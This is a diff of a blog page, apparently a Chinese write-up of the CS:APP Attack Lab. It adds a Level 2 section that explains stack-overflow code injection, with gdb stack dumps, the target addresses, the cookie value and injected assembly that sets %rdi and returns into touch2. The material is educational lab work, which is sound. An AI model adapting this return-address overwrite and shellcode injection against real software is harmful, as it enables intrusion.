@@ -94,7 +94,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      3 min read
+      4 min read
     
 </span></p>
 
@@ -328,6 +328,46 @@ PASS: Would have posted the following:
 
 <h4 id="0x12-level-2">
 <a class="anchor" href="#0x12-level-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.2 Level 2</h4>
+
+<p>level2 攻击需要对输入的字符串插入一小段可执行的代码，除了要求程序返回的时候跳转到 <code class="language-plaintext highlighter-rouge">touch2</code> 这个函数，还需要 <code class="language-plaintext highlighter-rouge">val==cookie</code> 这个条件满足。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Misfire: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>如果要执行到 <code class="language-plaintext highlighter-rouge">touch2</code>，那么和 level1 类似，只需要输入字符让其 overflow 栈中的内存，覆盖掉之前的返回地址即可。另外的一个需求是要对函数 <code class="language-plaintext highlighter-rouge">touch2</code> 的第一个参数修改为 <code class="language-plaintext highlighter-rouge">cookie</code> 这个值，需要插入一段汇编代码，但是如何让插入的这段汇编代码执行呢？</p>
+
+<p>原理可以用下面的这幅图来表示</p>
+
+<div align="center">
+<img src="/blogpages/images/csapp-attack/attack_preview.png" width="500">
+</div>
+
+<p>相当于在 Q stack frame 中插入一段字符串，不过不要用 <code class="language-plaintext highlighter-rouge">touch1</code> 的地址去覆盖之前的返回地址，而是用 B 的地址去覆盖，这样程序在执行完 Q 之后就会跳到 B 的地址出继续执行，而 B 地址出的内存是我们通过 string 传入的内容，这样我们就可以传入一段可以执行的命令，在执行完之后，通过 <code class="language-plaintext highlighter-rouge">retq</code> 再跳转到 <code class="language-plaintext highlighter-rouge">touch2</code> 的执行地址。</p>
+
+<p>前面通过 <code class="language-plaintext highlighter-rouge">gdb</code> 查看 <code class="language-plaintext highlighter-rouge">getbuf</code> 中的内存，发现栈顶的地址是 <code class="language-plaintext highlighter-rouge">0x0x5561dc78</code>，所以我们可以把需要执行的代码段在最前面写入，然后把这个地址放到 <code class="language-plaintext highlighter-rouge">0x4017c0</code> 的位置就可以插入我们要执行的代码。</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">b</span><span class="o">*</span><span class="mh">0x4017ac</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">r</span> <span class="o">-</span><span class="nx">q</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span><span class="o">/</span><span class="mi">6</span><span class="nx">gx</span> <span class="nx">$rsp</span>
+<span class="mh">0x5561dc78</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x5561dc88</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x5561dc98</span><span class="p">:</span>     <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000004017c0</span>
+</code></pre></div></div>
+
+<p>下面来看一下我们需要执行的代码应该怎么写，这里需要就 <code class="language-plaintext highlighter-rouge">val</code> 设置成 <code class="language-plaintext highlighter-rouge">cookie</code> 的值，可以简单地将 level1 中 <code class="language-plaintext highlighter-rouge">touch1</code> 的地址修改为 <code class="language-plaintext highlighter-rouge">touch2</code> 即执行到 <code class="language-plaintext highlighter-rouge">touch2</code> 中，然后通过 <code class="language-plaintext highlighter-rouge">x 0x6044e4</code> 发现 <code class="language-plaintext highlighter-rouge">cookie</code> 的值为 <code class="language-plaintext highlighter-rouge">0x59b997fa</code>，所以只需要把 <code class="language-plaintext highlighter-rouge">%rdi</code> 设置成 <code class="language-plaintext highlighter-rouge">cookie</code> 值即可，要写入的代码如下</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pushq</span> <span class="nx">$0x4017ec</span>
+<span class="nx">movq</span> <span class="nx">$0x59b997fa</span><span class="p">,</span><span class="o">%</span><span class="nx">rdi</span>
+<span class="nx">ret</span>
+</code></pre></div></div>
 
 <h4 id="0x13-level-3">
 <a class="anchor" href="#0x13-level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.3 Level 3</h4>
